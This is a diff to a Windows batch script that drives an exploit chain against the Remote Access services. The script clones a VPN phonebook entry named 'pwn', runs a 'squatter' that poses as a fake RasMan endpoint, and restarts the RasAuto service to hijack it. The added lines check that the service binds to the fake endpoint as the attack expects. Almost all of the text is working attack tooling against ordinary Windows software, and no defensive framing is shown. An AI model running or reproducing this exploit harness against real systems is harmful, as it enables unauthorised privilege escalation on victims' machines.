@@ -86,6 +86,20 @@ if errorlevel 1 exit /b 1
 cl /nologo /W3 /O2 /MT query_shared_connection.c /link rasapi32.lib /out:query_shared_connection.exe
 if errorlevel 1 exit /b 1
 
+echo [+] Verifying shared-connection prerequisite
+query_shared_connection.exe > qsc.txt
+type qsc.txt
+findstr /C:"err=0 value=" qsc.txt >nul
+if errorlevel 1 (
+    echo [!] RasQuerySharedConnection is not healthy
+    exit /b 1
+)
+findstr /C:"err=0 value=0" qsc.txt >nul
+if not errorlevel 1 (
+    echo [!] RasQuerySharedConnection returned value=0
+    exit /b 1
+)
+
 echo [+] Preparing the cloned phonebook entry used on the hang-up path
 powershell -ExecutionPolicy Bypass -File fix_phonebook_entry.ps1 -SourceEntry "%VPN_ENTRY%" -CloneEntry "pwn"
 if errorlevel 1 (
@@ -138,6 +152,18 @@ type squatter.log
 echo [+] Restarting RasAuto against the fake RasMan endpoint
 sc start RasAuto >nul 2>&1
 ping -n 3 127.0.0.1 >nul
+findstr /C:"code=113" squatter.log >nul
+if errorlevel 1 (
+    echo [!] RasAuto did not rebind against the fake RasMan endpoint
+    type squatter.log
+    exit /b 1
+)
+findstr /C:"code=55" squatter.log >nul
+if errorlevel 1 (
+    echo [!] RasAuto did not progress through the expected fake-endpoint setup path
+    type squatter.log
+    exit /b 1
+)
 
 echo [+] Current session state
 quser
